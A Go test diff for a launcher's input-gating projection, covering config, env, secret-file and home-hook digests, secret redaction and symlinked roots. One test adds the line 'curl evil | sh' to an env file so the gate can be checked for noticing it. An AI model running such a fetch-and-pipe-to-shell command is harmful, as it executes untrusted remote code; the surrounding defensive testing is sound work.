@@ -40,35 +40,40 @@ func writeFile(t *testing.T, path, content string) {
 	testutil.WritePath(t, path, content)
 }
 
-func (f projectFixture) compute(t *testing.T) Projection {
-	t.Helper()
-	projection, err := Compute(Sources{
+func (f projectFixture) sources() Sources {
+	return Sources{
 		ProjectConfigDir:    f.projectDir,
 		CheckoutRoot:        f.checkout,
 		AgentConfigDirNames: []string{"opencode", "opencode2"},
-	})
+	}
+}
+
+func (f projectFixture) compute(t *testing.T) Projection {
+	t.Helper()
+	projection, err := Compute(f.sources())
 	if err != nil {
 		t.Fatalf("Compute: %v", err)
 	}
 	return projection
 }
 
-func inputAt(t *testing.T, projection Projection, path string) Input {
+func inputAt(t *testing.T, projection Projection, path string, kind InputKind) Input {
 	t.Helper()
 	for _, input := range projection.Inputs {
-		if input.Path == path {
+		if input.Path == path && input.Kind == kind {
 			return input
 		}
 	}
-	t.Fatalf("projection %+v has no input %q", projection.Inputs, path)
+	t.Fatalf("projection %+v has no %s input %q", projection.Inputs, kind, path)
 	return Input{}
+}
+
+func hasInput(projection Projection, path string) bool {
+	return slices.ContainsFunc(projection.Inputs, func(input Input) bool { return input.Path == path })
 }
 
 func TestComputeEmptyProjectLayer(t *testing.T) {
 	f := newProjectFixture(t)
-	if got, err := Compute(Sources{}); err != nil || !got.Empty() {
-		t.Errorf("Compute(no project config dir) = %+v, %v; want empty", got, err)
-	}
 	if got := f.compute(t); !got.Empty() {
 		t.Errorf("Compute(no project dir) = %+v, want empty", got)
 	}
@@ -80,18 +85,29 @@ func TestComputeEmptyProjectLayer(t *testing.T) {
 	}
 }
 
+// TestComputeWithoutAProjectConfigDirReadsNothing pins that an excluded layer
+// reads nothing, not the current directory's files.
+func TestComputeWithoutAProjectConfigDirReadsNothing(t *testing.T) {
+	configpaths.WithMockConfigPaths(t)
+	cwd := t.TempDir()
+	writeFile(t, filepath.Join(cwd, "env"), "A=1\n")
+	writeFile(t, filepath.Join(cwd, "Dockerfile"), "FROM base\n")
+	t.Chdir(cwd)
+	if got, err := Compute(Sources{}); err != nil || !got.Empty() {
+		t.Errorf("Compute(no project config dir) = %+v, %v; want empty", got, err)
+	}
+}
+
 // TestComputeLauncherConfigIsOneEntryPerKey pins the launcher config effect:
 // every key the file sets, flattened and sorted, with a canonical value, so a
 // reorder or reformat keeps the digest while any value change alters it.
 func TestComputeLauncherConfigIsOneEntryPerKey(t *testing.T) {
 	f := newProjectFixture(t)
 	path := f.write(t, "config.yaml", "network:\n  profile: public\nmemory: 8G\nmounts:\n  /host: /\n")
-	got := inputAt(t, f.compute(t), path)
-	want := Input{Path: path, Kind: KindLauncherConfig, Entries: []string{
-		`memory: "8G"`, `mounts./host: "/"`, `network.profile: "public"`,
-	}}
-	if got.Kind != want.Kind || !slices.Equal(got.Entries, want.Entries) {
-		t.Errorf("config input = %+v, want %+v", got, want)
+	got := inputAt(t, f.compute(t), path, KindLauncherConfig)
+	want := []string{`memory: "8G"`, `mounts./host: "/"`, `network.profile: "public"`}
+	if !slices.Equal(got.Entries, want) {
+		t.Errorf("config entries = %q, want %q", got.Entries, want)
 	}
 
 	before := f.compute(t).Digest()
@@ -105,12 +121,39 @@ func TestComputeLauncherConfigIsOneEntryPerKey(t *testing.T) {
 	}
 }
 
+// TestComputeHomeManifestKeepsTheKeysCase pins that the home: entries are
+// projected as home provisioning parses them: a case-only change to a key it
+// reads, which the lowercased config keys cannot tell apart, changes the digest.
+func TestComputeHomeManifestKeepsTheKeysCase(t *testing.T) {
+	f := newProjectFixture(t)
+	path := f.write(t, "config.yaml", "home:\n  bin/hook.sh: {source: hook.sh, hook: startup, Root: true}\n")
+	got := inputAt(t, f.compute(t), path, KindHomeManifest)
+	if !slices.Equal(got.Entries, []string{`bin/hook.sh ← "hook.sh" hook="startup" root=false`}) {
+		t.Errorf("home entries = %q", got.Entries)
+	}
+	before := f.compute(t).Digest()
+	f.write(t, "config.yaml", "home:\n  bin/hook.sh: {source: hook.sh, hook: startup, root: true}\n")
+	if f.compute(t).Digest() == before {
+		t.Error("a case-only change that makes the hook run as root kept the digest")
+	}
+}
+
 func TestComputeEnvFileIsItsVariables(t *testing.T) {
 	f := newProjectFixture(t)
 	path := f.write(t, "env", "# comment\nB=2\nA=1\n")
-	got := inputAt(t, f.compute(t), path)
-	if got.Kind != KindEnv || !slices.Equal(got.Entries, []string{"A=1", "B=2"}) {
-		t.Errorf("env input = %+v, want the sorted variables", got)
+	got := inputAt(t, f.compute(t), path, KindEnv)
+	if !slices.Equal(got.Entries, []string{"A=1", "B=2"}) {
+		t.Errorf("env entries = %q, want the sorted variables", got.Entries)
+	}
+}
+
+func TestComputeSkipsAnEnvPathThatIsNoFile(t *testing.T) {
+	f := newProjectFixture(t)
+	if err := os.MkdirAll(filepath.Join(f.projectDir, "env"), 0o750); err != nil {
+		t.Fatal(err)
+	}
+	if got := f.compute(t); hasInput(got, filepath.Join(f.projectDir, "env")) {
+		t.Errorf("a directory named env became an input: %+v", got.Inputs)
 	}
 }
 
@@ -118,30 +161,54 @@ func TestComputeEnvFileIsItsVariables(t *testing.T) {
 // are gated while its value never reaches the projection.
 func TestComputeSecretFilesAreStructureOnly(t *testing.T) {
 	f := newProjectFixture(t)
-	legacy := f.write(t, "env.secret", "GH_TOKEN=ghp_legacyvalue@api.github.com\n")
-	yamlFile := f.write(t, "env.secret.yaml",
-		"API_KEY:\n  value: sk_yamlvalue\n  hosts: [b.example.com, a.example.com]\n  header_fields: [authorization]\n"+
+	legacy := f.write(t, "env.secret", "GH_TOKEN=ghp_legacyvalue@api.github.com\nBROKEN=nohostvalue\n")
+	yamlFile := f.write(
+		t,
+		"env.secret.yaml",
+		"API_KEY:\n  value: sk_yamlvalue\n  hosts: [b.example.com, a.example.com]\n  header_fields: [x-key, authorization]\n"+
 			"ANY:\n  value: anyvalue\n  allow_any_host_dangerous: true\n"+
 			"ONE:\n  value: onevalue\n  host: one.example.com\n"+
-			"PLAIN:\n  value: plainvalue\n")
+			"PLAIN:\n  value: plainvalue\n",
+	)
 	projection := f.compute(t)
 
-	if got := inputAt(t, projection, legacy); got.Kind != KindSecrets ||
-		!slices.Equal(got.Entries, []string{"GH_TOKEN: hosts api.github.com"}) {
-		t.Errorf("legacy secret input = %+v", got)
+	if got := inputAt(
+		t,
+		projection,
+		legacy,
+		KindSecrets,
+	); !slices.Equal(
+		got.Entries,
+		[]string{"GH_TOKEN: hosts api.github.com"},
+	) {
+		t.Errorf("legacy secret entries = %q", got.Entries)
 	}
 	want := []string{
 		"ANY: any host (dangerous)",
-		"API_KEY: hosts a.example.com, b.example.com; header fields authorization",
+		"API_KEY: hosts a.example.com, b.example.com; header fields authorization, x-key",
 		"ONE: hosts one.example.com",
 		"PLAIN",
 	}
-	if got := inputAt(t, projection, yamlFile); got.Kind != KindSecrets || !slices.Equal(got.Entries, want) {
-		t.Errorf("yaml secret input = %+v, want entries %q", got, want)
+	if got := inputAt(t, projection, yamlFile, KindSecrets); !slices.Equal(got.Entries, want) {
+		t.Errorf("yaml secret entries = %q, want %q", got.Entries, want)
 	}
+	assertNoSecretValues(
+		t,
+		projection,
+		"ghp_legacyvalue",
+		"nohostvalue",
+		"sk_yamlvalue",
+		"anyvalue",
+		"onevalue",
+		"plainvalue",
+	)
+}
+
+func assertNoSecretValues(t *testing.T, projection Projection, values ...string) {
+	t.Helper()
 	for _, input := range projection.Inputs {
 		for _, entry := range input.Entries {
-			for _, value := range []string{"ghp_legacyvalue", "sk_yamlvalue", "anyvalue", "onevalue", "plainvalue"} {
+			for _, value := range values {
 				if strings.Contains(entry, value) {
 					t.Fatalf("entry %q of %s leaks the secret value", entry, input.Path)
 				}
@@ -153,7 +220,7 @@ func TestComputeSecretFilesAreStructureOnly(t *testing.T) {
 func TestComputeFileInputsAreTheirContent(t *testing.T) {
 	f := newProjectFixture(t)
 	dockerfile := f.write(t, "Dockerfile", "FROM base\nRUN make\n")
-	snippet := f.write(t, "opencode/opencode.json", `{"model":"x"}`)
+	snippet := f.write(t, "opencode/opencode.json", "{\"model\":\"x\"}\n")
 	plugin := f.write(t, "opencode2/plugin/a.ts", "export {}\n")
 	stray := f.write(t, "README.md", "not consumed\n")
 	projection := f.compute(t)
@@ -166,26 +233,60 @@ func TestComputeFileInputsAreTheirContent(t *testing.T) {
 		{snippet, []string{`{"model":"x"}`}},
 		{plugin, []string{"export {}"}},
 	} {
-		if got := inputAt(t, projection, tc.path); got.Kind != KindFile || !slices.Equal(got.Entries, tc.want) {
-			t.Errorf("input %s = %+v, want content %q", tc.path, got, tc.want)
+		if got := inputAt(t, projection, tc.path, KindFile); !slices.Equal(got.Entries, tc.want) {
+			t.Errorf("input %s = %q, want content %q", tc.path, got.Entries, tc.want)
 		}
 	}
-	for _, input := range projection.Inputs {
-		if input.Path == stray {
-			t.Errorf("a file the launcher does not consume was gated: %s", stray)
-		}
+	if hasInput(projection, stray) {
+		t.Errorf("a file the launcher does not consume was gated: %s", stray)
 	}
 }
 
+// TestComputeFileContentKeepsEveryByte pins that content differing only in the
+// final newline, or an empty file against a lone newline, is a change.
+func TestComputeFileContentKeepsEveryByte(t *testing.T) {
+	f := newProjectFixture(t)
+	path := filepath.Join(f.projectDir, "Dockerfile")
+	digests := map[string]string{}
+	for _, content := range []string{"FROM base", "FROM base\n", "", "\n"} {
+		writeFile(t, path, content)
+		digests[f.compute(t).Digest()] = content
+	}
+	if len(digests) != 4 {
+		t.Errorf("distinct contents shared a digest: %q", digests)
+	}
+	writeFile(t, path, "FROM base")
+	if got := inputAt(
+		t,
+		f.compute(t),
+		path,
+		KindFile,
+	); !slices.Equal(
+		got.Entries,
+		[]string{"FROM base", noFinalNewline},
+	) {
+		t.Errorf("entries = %q, want the missing final newline marked", got.Entries)
+	}
+}
+
+// TestComputeLargeOrBinaryFilesAreADigest pins the display bound: a file up to
+// it is shown line by line, a larger or binary one is a digest, and a file
+// beyond any read bound is still gated rather than skipped.
 func TestComputeLargeOrBinaryFilesAreADigest(t *testing.T) {
 	f := newProjectFixture(t)
+	atBound := f.write(t, "opencode/at.txt", strings.Repeat("x", maxContentBytes))
 	large := f.write(t, "opencode/big.txt", strings.Repeat("x", maxContentBytes+1))
 	binary := f.write(t, "opencode/bin.dat", "\xff\xfe\x00")
+	dockerfile := f.write(t, "Dockerfile", strings.Repeat("RUN true\n", 3*maxContentBytes))
 	projection := f.compute(t)
-	for _, path := range []string{large, binary} {
-		got := inputAt(t, projection, path)
+
+	if got := inputAt(t, projection, atBound, KindFile); strings.HasPrefix(got.Entries[0], "sha256:") {
+		t.Error("a file at the bound was shown as a digest")
+	}
+	for _, path := range []string{large, binary, dockerfile} {
+		got := inputAt(t, projection, path, KindFile)
 		if len(got.Entries) != 1 || !strings.HasPrefix(got.Entries[0], "sha256:") {
-			t.Errorf("input %s = %+v, want a single sha256 entry", path, got.Entries)
+			t.Errorf("input %s = %d entries, want a single sha256 entry", path, len(got.Entries))
 		}
 	}
 }
@@ -211,18 +312,48 @@ func TestComputeHomeSourcesAreGatedByTheirResolvedPath(t *testing.T) {
 	projection := f.compute(t)
 
 	for path, want := range map[string][]string{
-		hook:                                 {"#!/bin/sh", "echo hi"},
-		checkoutScript:                       {"make setup"},
-		filepath.Join(checkoutDir, "a.conf"): {"a"},
+		hook:           {"#!/bin/sh", "echo hi"},
+		checkoutScript: {"make setup"},
 	} {
-		if got := inputAt(t, projection, path); got.Kind != KindFile || !slices.Equal(got.Entries, want) {
-			t.Errorf("home source %s = %+v, want content %q", path, got, want)
+		if got := inputAt(t, projection, path, KindFile); !slices.Equal(got.Entries, want) {
+			t.Errorf("home source %s = %q, want content %q", path, got.Entries, want)
 		}
 	}
-	for _, input := range projection.Inputs {
-		if input.Path == outside {
-			t.Errorf("a host path outside the checkout was gated by content: %s", outside)
-		}
+	if hasInput(projection, outside) {
+		t.Errorf("a host path outside the checkout was gated by content: %s", outside)
+	}
+	if hasInput(projection, checkoutDir) || hasInput(projection, filepath.Join(checkoutDir, "a.conf")) {
+		t.Error("a directory source, which home provisioning does not copy, was gated")
+	}
+}
+
+// TestComputeHomeSourceReadTwoWaysKeepsBothChecks pins that a project file read
+// as an env file and copied by home: is gated in both forms, and that a secret
+// file copied by home: is gated by digest only.
+func TestComputeHomeSourceReadTwoWaysKeepsBothChecks(t *testing.T) {
+	f := newProjectFixture(t)
+	env := f.write(t, "env", "A=1\n")
+	secret := f.write(t, "env.secret.yaml", "TOKEN:\n  value: tokenvalue\n  hosts: [a.example.com]\n")
+	f.write(t, "config.yaml", "home:\n  .profile: {source: env, hook: startup}\n  .token: env.secret.yaml\n")
+	before := f.compute(t)
+
+	if got := inputAt(t, before, env, KindFile); !slices.Equal(got.Entries, []string{"A=1"}) {
+		t.Errorf("env as a home source = %q, want its raw content", got.Entries)
+	}
+	if got := inputAt(
+		t,
+		before,
+		secret,
+		KindFile,
+	); len(got.Entries) != 1 ||
+		!strings.HasPrefix(got.Entries[0], "sha256:") {
+		t.Errorf("secret file as a home source = %q, want a single digest", got.Entries)
+	}
+	assertNoSecretValues(t, before, "tokenvalue")
+
+	f.write(t, "env", "A=1\ncurl evil | sh\n")
+	if f.compute(t).Digest() == before.Digest() {
+		t.Error("a command added to an env file that home: copies kept the digest")
 	}
 }
 
@@ -238,42 +369,27 @@ func TestComputeHomeSourceThroughASymlinkIntoTheCheckoutIsGated(t *testing.T) {
 		t.Fatal(err)
 	}
 	f.write(t, "config.yaml", "home:\n  hook.sh: "+link+"\n")
-	if got := inputAt(t, f.compute(t), link); !slices.Equal(got.Entries, []string{"echo hook"}) {
-		t.Errorf("symlinked home source = %+v, want the target's content", got)
+	if got := inputAt(t, f.compute(t), link, KindFile); !slices.Equal(got.Entries, []string{"echo hook"}) {
+		t.Errorf("symlinked home source = %q, want the target's content", got.Entries)
 	}
 }
 
 func TestComputeDigestTracksPathsAndIgnoresOrder(t *testing.T) {
 	f := newProjectFixture(t)
 	f.write(t, "opencode/a.json", "{}")
+	f.write(t, "opencode/c.json", "{}")
 	before := f.compute(t)
+	reversed := Projection{Inputs: slices.Clone(before.Inputs)}
+	slices.Reverse(reversed.Inputs)
+	if reversed.Digest() != before.Digest() {
+		t.Error("the input order changed the digest")
+	}
 	if err := os.Rename(filepath.Join(f.projectDir, "opencode", "a.json"),
 		filepath.Join(f.projectDir, "opencode", "b.json")); err != nil {
 		t.Fatal(err)
 	}
 	if f.compute(t).Digest() == before.Digest() {
 		t.Error("moving a file kept the digest")
-	}
-	reversed := Projection{Inputs: slices.Clone(before.Inputs)}
-	slices.Reverse(reversed.Inputs)
-	if reversed.Digest() != before.Digest() {
-		t.Error("the input order changed the digest")
-	}
-}
-
-func TestComputeReportsAnUnparsableConfig(t *testing.T) {
-	f := newProjectFixture(t)
-	f.write(t, "config.yaml", "memory: [unclosed\n")
-	if _, err := Compute(Sources{ProjectConfigDir: f.projectDir, CheckoutRoot: f.checkout}); err == nil {
-		t.Error("Compute accepted an unparsable project config")
-	}
-}
-
-func TestComputeReportsAnInvalidHomeSection(t *testing.T) {
-	f := newProjectFixture(t)
-	f.write(t, "config.yaml", "home: [not, a, map]\n")
-	if _, err := Compute(Sources{ProjectConfigDir: f.projectDir, CheckoutRoot: f.checkout}); err == nil {
-		t.Error("Compute accepted an invalid home: section")
 	}
 }
 
@@ -287,14 +403,62 @@ func TestDigestTreatsEmptyAndAbsentEntriesAlike(t *testing.T) {
 	}
 }
 
-// TestGuestWritableChecksEachRootAsSpelledAndResolved pins the roots test: an
-// unset root never matches, a root that does not exist is compared as spelled.
-func TestGuestWritableChecksEachRootAsSpelledAndResolved(t *testing.T) {
-	missingRoot := filepath.Join(t.TempDir(), "gone")
-	if !guestWritable(filepath.Join(missingRoot, "a.sh"), "", missingRoot) {
-		t.Error("a path under a missing root was not matched as spelled")
+func TestComputeReportsAnUnparsableConfig(t *testing.T) {
+	f := newProjectFixture(t)
+	f.write(t, "config.json5", "{memory: [}")
+	_, err := Compute(f.sources())
+	if err == nil || !strings.Contains(err.Error(), "launcher config") {
+		t.Errorf("Compute = %v, want the launcher config parse error", err)
 	}
-	if guestWritable("/elsewhere/a.sh", "", missingRoot) {
-		t.Error("a path outside every root was matched")
+}
+
+func TestComputeReportsAnInvalidHomeSection(t *testing.T) {
+	f := newProjectFixture(t)
+	f.write(t, "config.yaml", "home: [not, a, map]\n")
+	if _, err := Compute(f.sources()); err == nil {
+		t.Error("Compute accepted an invalid home: section")
+	}
+}
+
+// TestComputeReportsAnUnreadableInput pins that a project input the gate
+// cannot read is an error, never an absent input that would be approved.
+func TestComputeReportsAnUnreadableInput(t *testing.T) {
+	f := newProjectFixture(t)
+	writeFile(t, f.projectDir, "not a directory\n")
+	if _, err := Compute(f.sources()); err == nil {
+		t.Error("Compute skipped a project input it could not read")
+	}
+}
+
+// TestGuestWritableComparesSpelledAndResolvedPaths pins the root test: a path
+// under a root matches as spelled or resolved, a root reached through a
+// symlink matches its target's files, and nothing outside matches.
+func TestGuestWritableComparesSpelledAndResolvedPaths(t *testing.T) {
+	realRoot := t.TempDir()
+	linkedRoot := filepath.Join(t.TempDir(), "checkout")
+	if err := os.Symlink(realRoot, linkedRoot); err != nil {
+		t.Fatal(err)
+	}
+	writeFile(t, filepath.Join(realRoot, "a.sh"), "a\n")
+	missingRoot := filepath.Join(t.TempDir(), "gone")
+
+	for _, tc := range []struct {
+		name  string
+		path  string
+		roots []string
+		want  bool
+	}{
+		{"under a missing root as spelled", filepath.Join(missingRoot, "a.sh"), []string{"", missingRoot}, true},
+		{"under a symlinked root", filepath.Join(realRoot, "a.sh"), []string{linkedRoot}, true},
+		{"through a symlinked root", filepath.Join(linkedRoot, "a.sh"), []string{realRoot}, true},
+		{"outside every root", "/elsewhere/a.sh", []string{"", missingRoot}, false},
+		{"the root's parent", filepath.Dir(missingRoot), []string{missingRoot}, false},
+		{"against a relative root", "/abs/a.sh", []string{"relative"}, false},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			if got := guestWritable(tc.path, tc.roots...); got != tc.want {
+				t.Errorf("guestWritable(%q, %q) = %v, want %v", tc.path, tc.roots, got, tc.want)
+			}
+		})
 	}
 }
